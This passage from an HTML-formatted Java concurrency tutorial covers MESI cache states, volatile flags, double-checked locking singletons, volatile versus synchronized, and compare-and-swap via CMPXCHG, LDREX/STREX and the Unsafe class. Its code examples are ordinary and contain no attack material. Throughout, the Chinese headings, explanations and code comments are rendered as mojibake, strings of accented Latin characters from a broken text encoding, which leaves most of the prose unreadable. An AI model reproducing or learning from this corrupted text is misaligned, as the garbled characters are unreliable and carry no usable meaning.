<table><thead><tr><th>çŠ¶æ€</th><th>å…¨ç§°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><strong>M</strong></td><td>Modified</td><td>ç¼“å­˜è¡Œè¢«ä¿®æ”¹ï¼Œä¸ä¸»å†…å­˜ä¸ä¸€è‡´</td></tr><tr><td><strong>E</strong></td><td>Exclusive</td><td>ç¼“å­˜è¡Œç‹¬å ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>S</strong></td><td>Shared</td><td>ç¼“å­˜è¡Œå…±äº«ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>I</strong></td><td>Invalid</td><td>ç¼“å­˜è¡Œæ— æ•ˆï¼Œéœ€è¦ä»ä¸»å†…å­˜åŠ è½½</td></tr></tbody></table>
<p><strong>volatileå˜é‡çš„ç¼“å­˜ä¸€è‡´æ€§ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">åœºæ™¯ï¼šCPU1å†™volatileå˜é‡

<span class="hljs-bullet">1.</span> CPU1ä¿®æ”¹volatileå˜é‡
   â†’ ç¼“å­˜è¡ŒçŠ¶æ€å˜ä¸ºMï¼ˆModifiedï¼‰

<span class="hljs-bullet">2.</span> é€šè¿‡æ€»çº¿å‘é€æ¶ˆæ¯
   â†’ é€šçŸ¥å…¶ä»–CPUï¼šè¿™ä¸ªç¼“å­˜è¡Œå·²å¤±æ•ˆ

<span class="hljs-bullet">3.</span> å…¶ä»–CPUæ”¶åˆ°æ¶ˆæ¯
   â†’ å°†å¯¹åº”ç¼“å­˜è¡ŒçŠ¶æ€æ”¹ä¸ºIï¼ˆInvalidï¼‰

<span class="hljs-bullet">4.</span> å…¶ä»–CPUè¯»å–æ—¶
   â†’ å‘ç°ç¼“å­˜æ— æ•ˆï¼Œä»ä¸»å†…å­˜é‡æ–°åŠ è½½
   â†’ ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦MESIï¼Ÿ</strong></p>
<ul>
<li>æ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜</li>
<li>éœ€è¦ä¿è¯æ‰€æœ‰CPUçœ‹åˆ°çš„æ•°æ®ä¸€è‡´</li>
<li>MESIåè®®è‡ªåŠ¨å¤„ç†ç¼“å­˜ä¸€è‡´æ€§</li>
</ul>
<h3 data-id="heading-90">4.3 volatileçš„ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-91">çŠ¶æ€æ ‡å¿—</h4>
<p><strong>æœ€å¸¸ç”¨çš„åœºæ™¯ï¼š</strong> ä½¿ç”¨volatileä½œä¸ºçº¿ç¨‹é—´çš„çŠ¶æ€æ ‡å¿—</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ¨èï¼šä½¿ç”¨volatileä½œä¸ºçŠ¶æ€æ ‡å¿—</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    shutdown = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!shutdown) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
        <span class="hljs-comment">// èƒ½åŠæ—¶å“åº”shutdownçš„å˜åŒ–</span>
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé€‚åˆç”¨volatileï¼Ÿ</strong></p>
<ul>
<li>âœ… åªéœ€è¦å¯è§æ€§ï¼ˆçº¿ç¨‹é—´é€šä¿¡ï¼‰</li>
<li>âœ… ä¸éœ€è¦åŸå­æ€§ï¼ˆåªæ˜¯booleanæ ‡å¿—ï¼‰</li>
<li>âœ… ç®€å•é«˜æ•ˆï¼ˆæ¯”synchronizedè½»é‡ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… çº¿ç¨‹å¯åŠ¨/åœæ­¢æ ‡å¿—</li>
<li>âœ… é…ç½®å¼€å…³</li>
<li>âœ… çŠ¶æ€åˆ‡æ¢æ ‡å¿—</li>
</ul>
<h4 data-id="heading-92">åŒé‡æ£€æŸ¥é”å®šï¼ˆDCLï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯DCLï¼Ÿ</strong></p>
<p>åŒé‡æ£€æŸ¥é”å®šæ˜¯ä¸€ç§å•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ï¼Œé€šè¿‡ä¸¤æ¬¡æ£€æŸ¥æ¥å‡å°‘é”çš„ä½¿ç”¨ã€‚</p>
<p><strong>é”™è¯¯çš„å•ä¾‹æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½æœ‰é—®é¢˜</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰</span>
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰</span>
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">// âš ï¸ å¯èƒ½é‡æ’åº</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>é—®é¢˜ï¼šå¯¹è±¡åˆ›å»ºå¯èƒ½é‡æ’åº</strong></p>
<p><code>new Singleton()</code>åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼Œå¯èƒ½è¢«é‡æ’åºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ­£å¸¸é¡ºåº</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡ï¼ˆè°ƒç”¨æ„é€ å‡½æ•°ï¼‰
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance

<span class="hljs-comment">// å¯èƒ½é‡æ’åºä¸ºï¼ˆå±é™©ï¼ï¼‰</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance  <span class="hljs-comment">// instance != nullï¼Œä½†å¯¹è±¡æœªåˆå§‹åŒ–ï¼</span>
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡

<span class="hljs-comment">// é—®é¢˜ï¼šçº¿ç¨‹Bå¯èƒ½æ‹¿åˆ°æœªå®Œå…¨åˆå§‹åŒ–çš„å¯¹è±¡</span>
</code></pre>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  
                    <span class="hljs-comment">// volatileä¿è¯ï¼šå…ˆåˆå§‹åŒ–å¯¹è±¡ï¼Œå†èµ‹å€¼</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>volatileçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç¦æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å¯¹è±¡å®Œå…¨åˆå§‹åŒ–åæ‰èµ‹å€¼</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå…¶ä»–çº¿ç¨‹èƒ½çœ‹åˆ°å®Œæ•´çš„å¯¹è±¡</li>
</ul>
<p><strong>DCLçš„å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰ï¼šå¿«é€Ÿè·¯å¾„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ç›´æ¥è¿”å›
  â†“
  å¦‚æœä¸º<span class="hljs-literal">null</span>ï¼Œè¿›å…¥åŒæ­¥å—
  â†“
ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰ï¼šç¡®ä¿åªåˆ›å»ºä¸€ä¸ªå®ä¾‹
  â†“
  å¦‚æœä»ä¸º<span class="hljs-literal">null</span>ï¼Œåˆ›å»ºå®ä¾‹
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç¬¬ä¸€æ¬¡æ£€æŸ¥æ— é”ï¼Œæ€§èƒ½å¥½</li>
<li>åªåœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶åŠ é”</li>
<li>ä¹‹åéƒ½æ˜¯æ— é”è®¿é—®</li>
</ul>
<h4 data-id="heading-93">å•ä¾‹æ¨¡å¼ä¸­çš„åº”ç”¨</h4>
<p><strong>æšä¸¾æ–¹å¼ï¼ˆæ¨èï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> {
    INSTANCE;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p><strong>é™æ€å†…éƒ¨ç±»æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> {}
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Holder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Holder.INSTANCE;
    }
}
</code></pre>
<h3 data-id="heading-94">4.4 volatile vs synchronized</h3>
<h4 data-id="heading-95">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>volatileçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li>âœ… <strong>è¯»æ“ä½œ</strong>ï¼šæ€§èƒ½æ¥è¿‘æ™®é€šå˜é‡ï¼ˆåªæ˜¯ä»ä¸»å†…å­˜è¯»ï¼‰</li>
<li>âš ï¸ <strong>å†™æ“ä½œ</strong>ï¼šéœ€è¦åˆ·æ–°ç¼“å­˜ï¼Œæ€§èƒ½ç•¥å·®ï¼ˆä½†æ¯”synchronizedå¥½ï¼‰</li>
<li>âœ… <strong>æ€»ä½“</strong>ï¼šæ€§èƒ½ä¼˜äºsynchronized</li>
</ul>
<p><strong>synchronizedçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li><strong>JDK 1.6ä¹‹å‰</strong>ï¼šé‡é‡çº§é”ï¼Œæ€§èƒ½è¾ƒå·®</li>
<li><strong>JDK 1.6ä¹‹å</strong>ï¼šé”å‡çº§ä¼˜åŒ–ï¼Œæ€§èƒ½å¤§å¹…æå‡</li>
<li><strong>æ€»ä½“</strong>ï¼šåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘volatile</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä½ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: å¾ˆå¿«ï¼ˆå‡ ä¹æ— å¼€é”€ï¼‰
<span class="hljs-keyword">synchronized</span>: è¾ƒå¿«ï¼ˆåå‘é”/è½»é‡çº§é”ï¼‰

é«˜ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: ä»ç„¶å¾ˆå¿«ï¼ˆåªæ˜¯åˆ·æ–°ç¼“å­˜ï¼‰
<span class="hljs-keyword">synchronized</span>: å¯èƒ½å˜æ…¢ï¼ˆå‡çº§ä¸ºé‡é‡çº§é”ï¼‰
</code></pre>
<h4 data-id="heading-96">ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h4>
<p><strong>åŠŸèƒ½å¯¹æ¯”è¡¨ï¼š</strong></p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>volatile</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>å¯è§æ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>åŸå­æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æœ‰åºæ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>äº’æ–¥æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>âœ… è¾ƒé«˜</td><td>âš ï¸ ä¸­ç­‰</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>âœ… ç®€å•</td><td>âš ï¸ ä¸­ç­‰</td></tr></tbody></table>
<p><strong>volatileé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šbooleanç±»å‹çš„çº¿ç¨‹é—´é€šä¿¡</li>
<li>âœ… <strong>åŒé‡æ£€æŸ¥é”å®š</strong>ï¼šå•ä¾‹æ¨¡å¼</li>
<li>âœ… <strong>è¯»å¤šå†™å°‘</strong>ï¼šåªéœ€è¦å¯è§æ€§ï¼Œä¸éœ€è¦äº’æ–¥</li>
<li>âœ… <strong>ç‹¬ç«‹è§‚å¯Ÿ</strong>ï¼šå‘å¸ƒè§‚å¯Ÿç»“æœç»™å…¶ä»–çº¿ç¨‹</li>
</ul>
<p><strong>synchronizedé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>éœ€è¦åŸå­æ€§</strong>ï¼šå¤šæ­¥éª¤æ“ä½œéœ€è¦åŸå­æ‰§è¡Œ</li>
<li>âœ… <strong>éœ€è¦äº’æ–¥</strong>ï¼šåŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ</li>
<li>âœ… <strong>å¤æ‚åŒæ­¥</strong>ï¼šéœ€è¦æ›´å¤æ‚çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">åªéœ€è¦å¯è§æ€§ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ éœ€è¦åŸå­æ€§ï¼Ÿ
       â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">synchronized</span>æˆ–åŸå­ç±»
       â””â”€ å¦ â†’ æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©

è¯»å¤šå†™å°‘ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> + CAS âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>

ç®€å•æ ‡å¿—ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>
</code></pre>
<p><strong>å®é™…å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šä¼˜å…ˆä½¿ç”¨volatile</li>
<li><strong>è®¡æ•°å™¨ç­‰</strong>ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆAtomicIntegerï¼‰</li>
<li><strong>å¤æ‚åŒæ­¥</strong>ï¼šä½¿ç”¨synchronized</li>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼švolatile + CAS</li>
</ul>
<hr/>
<h2 data-id="heading-97">ç¬¬äº”ç«  CASï¼ˆCompare-And-Swapï¼‰</h2>
<h3 data-id="heading-98">5.1 CASåŸç†</h3>
<h4 data-id="heading-99">CASæ“ä½œçš„å®šä¹‰</h4>
<p>**CASï¼ˆCompare-And-Swapï¼‰**æ˜¯ä¸€ç§æ— é”çš„åŸå­æ“ä½œï¼Œç”¨äºå®ç°å¤šçº¿ç¨‹åŒæ­¥ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯CASï¼Ÿ</strong></p>
<ul>
<li>CASæ˜¯"æ¯”è¾ƒå¹¶äº¤æ¢"çš„æ„æ€</li>
<li>å®ƒæ˜¯ä¸€ç§ä¹è§‚é”çš„å®ç°æ–¹å¼</li>
<li>ä¸åƒæ‚²è§‚é”ï¼ˆå¦‚synchronizedï¼‰å…ˆè·å–é”å†æ“ä½œï¼ŒCASå…ˆå°è¯•æ“ä½œï¼Œå¤±è´¥äº†å†é‡è¯•</li>
</ul>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æƒ³è±¡ä¸€ä¸ªå‚¨ç‰©æŸœï¼Œä½ æƒ³æŠŠé‡Œé¢çš„ä¸œè¥¿æ¢æ‰</li>
<li>CASå°±æ˜¯ï¼šå…ˆçœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯ä½ æœŸæœ›çš„ä¸œè¥¿ï¼ˆæ¯”è¾ƒï¼‰</li>
<li>å¦‚æœæ˜¯ï¼Œå°±æ¢æˆæ–°çš„ï¼ˆäº¤æ¢ï¼‰</li>
<li>å¦‚æœä¸æ˜¯ï¼Œè¯´æ˜è¢«åˆ«äººæ¢è¿‡äº†ï¼Œé‡æ–°è¯»å–å†å°è¯•</li>
</ul>
<p><strong>CASæ“ä½œåŒ…å«ä¸‰ä¸ªæ“ä½œæ•°ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜ä½ç½®ï¼ˆVï¼‰</strong>ï¼šè¦æ›´æ–°çš„å˜é‡ï¼ˆå°±åƒå‚¨ç‰©æŸœçš„ä½ç½®ï¼‰</li>
<li><strong>é¢„æœŸå€¼ï¼ˆAï¼‰</strong>ï¼šæœŸæœ›çš„æ—§å€¼ï¼ˆä½ æœŸæœ›çœ‹åˆ°çš„æ—§ä¸œè¥¿ï¼‰</li>
<li><strong>æ–°å€¼ï¼ˆBï¼‰</strong>ï¼šè¦è®¾ç½®çš„æ–°å€¼ï¼ˆä½ æƒ³æ”¾è¿›å»çš„æ–°ä¸œè¥¿ï¼‰</li>
</ul>
<p><strong>CASæ“ä½œé€»è¾‘ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è¯»å–å½“å‰å€¼ V
<span class="hljs-bullet">2.</span> æ¯”è¾ƒï¼šV æ˜¯å¦ç­‰äºé¢„æœŸå€¼ Aï¼Ÿ
<span class="hljs-bullet">   -</span> å¦‚æœç›¸ç­‰ â†’ å°† V æ›´æ–°ä¸º Bï¼ˆäº¤æ¢æˆåŠŸï¼‰
<span class="hljs-bullet">   -</span> å¦‚æœä¸ç›¸ç­‰ â†’ ä¸æ›´æ–°ï¼ˆäº¤æ¢å¤±è´¥ï¼Œå¯èƒ½è¢«åˆ«äººæ”¹è¿‡äº†ï¼‰
<span class="hljs-bullet">3.</span> è¿”å›æ“ä½œç»“æœ
</code></pre>
<p><strong>ä¼ªä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwap</span><span class="hljs-params">(<span class="hljs-type">int</span> V, <span class="hljs-type">int</span> A, <span class="hljs-type">int</span> B)</span> {
    <span class="hljs-keyword">if</span> (V == A) {        <span class="hljs-comment">// æ¯”è¾ƒï¼šå½“å‰å€¼æ˜¯å¦ç­‰äºé¢„æœŸå€¼ï¼Ÿ</span>
        V = B;           <span class="hljs-comment">// äº¤æ¢ï¼šæ›´æ–°ä¸ºæ–°å€¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;     <span class="hljs-comment">// æˆåŠŸ</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-comment">// å¤±è´¥ï¼Œè¿”å›å½“å‰å€¼</span>
}
</code></pre>
<p><strong>å®é™…è¿”å›å€¼ï¼š</strong></p>
<ul>
<li>æœ‰äº›CASå®ç°è¿”å›booleanï¼ˆæˆåŠŸ/å¤±è´¥ï¼‰</li>
<li>æœ‰äº›è¿”å›æ—§å€¼ï¼ˆè®©ä½ çŸ¥é“å½“å‰çš„å®é™…å€¼ï¼‰</li>
</ul>
<h4 data-id="heading-100">CASçš„åŸå­æ€§ä¿è¯</h4>
<p><strong>ä¸ºä»€ä¹ˆCASæ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p>CASä¹‹æ‰€ä»¥æ˜¯åŸå­æ“ä½œï¼Œæ˜¯å› ä¸º<strong>CPUç›´æ¥æä¾›äº†åŸå­æ€§çš„CASæŒ‡ä»¤</strong>ã€‚è¿™ä¸æ˜¯Javaè¯­è¨€å±‚é¢çš„ç‰¹æ€§ï¼Œè€Œæ˜¯ç¡¬ä»¶å±‚é¢çš„æ”¯æŒã€‚</p>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ol>
<li><strong>CPUæŒ‡ä»¤çº§åˆ«</strong>ï¼šCASæ˜¯CPUçš„ä¸€æ¡æŒ‡ä»¤ï¼Œä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œæ˜¯ä¸å¯åˆ†å‰²çš„</li>
<li><strong>ä¸ä¼šè¢«ä¸­æ–­</strong>ï¼šåœ¨æ‰§è¡ŒCASæŒ‡ä»¤æœŸé—´ï¼Œä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹æˆ–æ“ä½œä¸­æ–­</li>
<li><strong>ç¡¬ä»¶ä¿è¯</strong>ï¼šè¿™æ˜¯ç¡¬ä»¶å±‚é¢çš„ä¿è¯ï¼Œæ¯”è½¯ä»¶å±‚é¢çš„é”æ›´åº•å±‚ã€æ›´é«˜æ•ˆ</li>
</ol>
<p><strong>åŸå­æ€§çš„é‡è¦æ€§ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ éåŸå­æ“ä½œï¼ˆä¸å®‰å…¨ï¼Œæœ‰ç«æ€æ¡ä»¶ï¼‰</span>
<span class="hljs-keyword">if</span> (value == expected) {
    value = newValue;  <span class="hljs-comment">// è¿™ä¸¤æ­¥ä¸æ˜¯åŸå­çš„</span>
    <span class="hljs-comment">// é—®é¢˜ï¼šåœ¨æ£€æŸ¥å’Œèµ‹å€¼ä¹‹é—´ï¼Œvalueå¯èƒ½è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹</span>
}

<span class="hljs-comment">// âœ… CASåŸå­æ“ä½œï¼ˆå®‰å…¨ï¼‰</span>
compareAndSwap(value, expected, newValue);  
<span class="hljs-comment">// ä¸€æ­¥å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­ï¼ŒåŸå­æ€§ä¿è¯</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ™®é€šæ“ä½œä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<ul>
<li>æ™®é€šæ“ä½œåŒ…å«å¤šä¸ªæ­¥éª¤ï¼ˆè¯»å–ã€æ¯”è¾ƒã€å†™å…¥ï¼‰</li>
<li>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œè¿™äº›æ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´é—®é¢˜</li>
</ul>
<h4 data-id="heading-101">CPUåŸè¯­æ”¯æŒ</h4>
<p><strong>ä¸åŒCPUæ¶æ„çš„CASå®ç°ï¼š</strong></p>
<p><strong>x86/x64æ¶æ„ï¼ˆIntel/AMDï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; CMPXCHGæŒ‡ä»¤ï¼ˆCompare and Exchangeï¼‰
CMPXCHG dest, src
; åŠŸèƒ½ï¼šæ¯”è¾ƒEAXå¯„å­˜å™¨ä¸­çš„å€¼å’Œdestï¼Œå¦‚æœç›¸ç­‰ï¼Œå°†srcå†™å…¥dest
; è¿™æ˜¯x86æ¶æ„æä¾›çš„åŸå­æŒ‡ä»¤
</code></pre>
<p><strong>ARMæ¶æ„ï¼ˆæ‰‹æœº/åµŒå…¥å¼è®¾å¤‡ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; LDREX/STREXæŒ‡ä»¤å¯¹ï¼ˆLoad-Exclusive/Store-Exclusiveï¼‰
LDREX R1, [R0]        ; åŠ è½½å¹¶ç‹¬å è®¿é—®
CMP R1, R2            ; æ¯”è¾ƒ
STREXEQ R3, R4, [R0]  ; æ¡ä»¶å­˜å‚¨ï¼ˆå¦‚æœç‹¬å çŠ¶æ€è¿˜åœ¨ï¼‰
; é€šè¿‡ç‹¬å è®¿é—®æœºåˆ¶å®ç°åŸå­æ“ä½œ
</code></pre>
<p><strong>Javaä¸­çš„CASï¼š</strong></p>
<p>Javaé€šè¿‡<code>Unsafe</code>ç±»è°ƒç”¨åº•å±‚CPUæŒ‡ä»¤ï¼Œå¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Unsafeç±»æä¾›CASæ–¹æ³•ï¼ˆåº•å±‚è°ƒç”¨CPUæŒ‡ä»¤ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(
    Object o,     // å¯¹è±¡
    <span class="hljs-type">long</span> offset,  // å­—æ®µåç§»é‡ï¼ˆå†…å­˜åœ°å€ï¼‰
    <span class="hljs-type">int</span> expected, // é¢„æœŸå€¼
    <span class="hljs-type">int</span> x         // æ–°å€¼
)</span>;
<span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨CPUçš„CASæŒ‡ä»¤</span>
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ Unsafeç±» â†’ JVM â†’ CPUæŒ‡ä»¤</li>
<li>æœ€ç»ˆæ‰§è¡Œçš„æ˜¯CPUæä¾›çš„åŸå­æŒ‡ä»¤</li>
<li>å¼€å‘è€…ä¸éœ€è¦å…³å¿ƒåº•å±‚å®ç°ç»†èŠ‚</li>
</ul>
<h3 data-id="heading-102">5.2 CASçš„å®ç°</h3>
<h4 data-id="heading-103">Unsafeç±»</h4>
<p><strong>Unsafeç±»æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><code>Unsafe</code>ç±»æ˜¯Javaæä¾›çš„ä¸€ä¸ª"åé—¨"ç±»ï¼Œç”¨äºæ‰§è¡Œä¸€äº›ä¸å®‰å…¨çš„åº•å±‚æ“ä½œã€‚å®ƒçš„åå­—å°±è¯´æ˜äº†å®ƒçš„ç‰¹æ€§â€”â€”unsafeï¼ˆä¸å®‰å…¨ï¼‰ã€‚</p>
